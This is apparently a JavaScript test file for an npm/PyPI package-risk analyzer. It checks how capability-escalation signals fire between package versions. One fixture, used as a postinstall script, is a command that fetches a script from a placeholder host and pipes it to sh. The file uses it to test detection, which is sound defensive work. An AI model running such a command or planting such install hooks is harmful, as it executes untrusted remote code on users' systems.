import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { analyzePackage } from '../src/analysis/signals.js';

/**
 * REAL vs DEGRADED CAPABILITY DIFF
 *
 * Layer 3's CAPABILITY_ESCALATION (CRITICAL, "gained between versions") may
 * only fire when the previous version's capabilities are actually known —
 * i.e. the registry exposed the previous version's lifecycle scripts and
 * they were inspected with the same extractor as the current version. When
 * they aren't known, the finding must degrade to INITIAL_DANGEROUS_CAPABILITY
 * (MODERATE, "present now, no diff possible"). These tests pin both paths.
 */

// `node -e "..."` with a double-quoted payload: extractInlineJS lifts the JS
// out of the shell wrapper, and the AST inspector reads the child_process /
// network calls inside it.
const DANGEROUS_SCRIPT = 'node -e "require(\'child_process\').exec(\'curl http://example.invalid/p | sh\')"';
const BENIGN_SCRIPT = 'node -e "require(\'./build\').verify()"';

function makeMetadata({ currentScripts, previousScripts }) {
  return {
    name: 'pkg',
    latestVersion: '2.0.0',
    previousVersion: previousScripts === null ? null : '1.0.0',
    maintainers: [{ name: 'author' }],
    latestPublisher: 'author',
    previousPublisher: 'author',
    maintainerChanged: false,
    hasInstallScripts: Object.keys(currentScripts).length > 0,
    installScripts: currentScripts,
    previousInstallScripts: previousScripts,
    scripts: {},
    dependencies: [],
    addedDeps: [],
    removedDeps: [],
    latestPublishTime: new Date('2026-08-01T00:00:00Z'),
    previousPublishTime: new Date('2026-06-01T00:00:00Z'),
    publishIntervalMs: 61 * 24 * 60 * 60 * 1000,
    packageAgeMs: 4 * 365 * 24 * 60 * 60 * 1000,
    majorJump: 1,
    dormancyMs: null,
    versionCount: 3,
    repository: 'https://github.com/example/pkg',
    license: 'MIT',
  };
}

describe('real capability diff (previous scripts known)', () => {
  it('fires CAPABILITY_ESCALATION when dangerous capability is genuinely new', async () => {
    const meta = makeMetadata({
      currentScripts: { postinstall: DANGEROUS_SCRIPT },
      previousScripts: {}, // previous version verifiably had no scripts
    });
    const { signals } = await analyzePackage(meta, null, { ecosystem: 'npm' });

    const escalations = signals.filter(s => s.signal === 'CAPABILITY_ESCALATION');
    assert.ok(escalations.length > 0, 'expected a real escalation');
    assert.ok(
      !signals.some(s => s.signal === 'INITIAL_DANGEROUS_CAPABILITY'),
      'real diff must not degrade to the initial-capability signal'
    );
    assert.equal(escalations[0].layer, 3);
  });

  it('stays quiet when the previous version had the same dangerous capability', async () => {
    const meta = makeMetadata({
      currentScripts: { postinstall: DANGEROUS_SCRIPT },
      previousScripts: { postinstall: DANGEROUS_SCRIPT },
    });
    const { signals } = await analyzePackage(meta, null, { ecosystem: 'npm' });

    assert.ok(
      !signals.some(s => s.signal === 'CAPABILITY_ESCALATION'),
      'same capability in previous version is not an escalation'
    );
    assert.ok(
      !signals.some(s => s.signal === 'INITIAL_DANGEROUS_CAPABILITY'),
      'capabilities are known, so the degraded signal must not appear either'
    );
  });

  it('detects escalation from benign previous scripts to dangerous current ones', async () => {
    const meta = makeMetadata({
      currentScripts: { postinstall: DANGEROUS_SCRIPT },
      previousScripts: { postinstall: BENIGN_SCRIPT },
    });
    const { signals } = await analyzePackage(meta, null, { ecosystem: 'npm' });
    assert.ok(signals.some(s => s.signal === 'CAPABILITY_ESCALATION'));
  });

  it('escalation description is honest about the evidence source', async () => {
    const meta = makeMetadata({
      currentScripts: { postinstall: DANGEROUS_SCRIPT },
      previousScripts: {},
    });
    const { signals } = await analyzePackage(meta, null, { ecosystem: 'npm' });
    const escalation = signals.find(s => s.signal === 'CAPABILITY_ESCALATION');
    assert.match(escalation.description, /previous version's install scripts/);
  });
});

describe('degraded diff (previous capabilities unknown)', () => {
  it('degrades to INITIAL_DANGEROUS_CAPABILITY when previous scripts are null', async () => {
    const meta = makeMetadata({
      currentScripts: { postinstall: DANGEROUS_SCRIPT },
      previousScripts: null, // no previous version at all
    });
    const { signals } = await analyzePackage(meta, null, { ecosystem: 'npm' });

    const initial = signals.filter(s => s.signal === 'INITIAL_DANGEROUS_CAPABILITY');
    assert.ok(initial.length > 0, 'expected the degraded, honest signal');
    assert.ok(
      !signals.some(s => s.signal === 'CAPABILITY_ESCALATION'),
      'must never claim a between-versions diff without previous-version data'
    );
    assert.equal(initial[0].severity, 'MODERATE');
  });

  it('falls back to the degraded signal when a previous version exists but its scripts are unknown', async () => {
    // Simulates a registry that reports a previous version but no script
    // history (e.g. non-npm sources): capabilities unknown, no diff possible.
    const meta = makeMetadata({
      currentScripts: { postinstall: DANGEROUS_SCRIPT },
      previousScripts: null,
    });
    meta.previousVersion = '1.0.0'; // exists, but no script data for it

    const { signals } = await analyzePackage(meta, null, { ecosystem: 'npm' });
    assert.ok(signals.some(s => s.signal === 'INITIAL_DANGEROUS_CAPABILITY'));
    assert.ok(!signals.some(s => s.signal === 'CAPABILITY_ESCALATION'));
  });
});

describe('metadata-only diffs alongside the real capability diff', () => {
  it('DEPENDENCY_SPIKE still fires when the previous profile is built from real scripts', async () => {
    const meta = makeMetadata({
      currentScripts: { postinstall: DANGEROUS_SCRIPT },
      previousScripts: {},
    });
    // DEPENDENCY_SPIKE: 20 → 60 deps (> 2x and > 5). buildPreviousProfile
    // derives the previous count from dependencies minus addedDeps.
    meta.dependencies = Array.from({ length: 60 }, (_, i) => `dep-${i}`);
    meta.addedDeps = meta.dependencies.slice(20);
    meta.removedDeps = [];

    // Layer 2 fetches each added dep from the registry; the fake dep-N names
    // would mean 40 network requests. pypi skips Layer 2, and the Layer 3
    // spike/escalation logic under test here is ecosystem-agnostic.
    const { signals } = await analyzePackage(meta, null, { ecosystem: 'pypi' });
    assert.ok(signals.some(s => s.signal === 'DEPENDENCY_SPIKE'),
      'spike must survive the handoff to the real previous profile');
    assert.ok(signals.some(s => s.signal === 'CAPABILITY_ESCALATION'));
  });
});
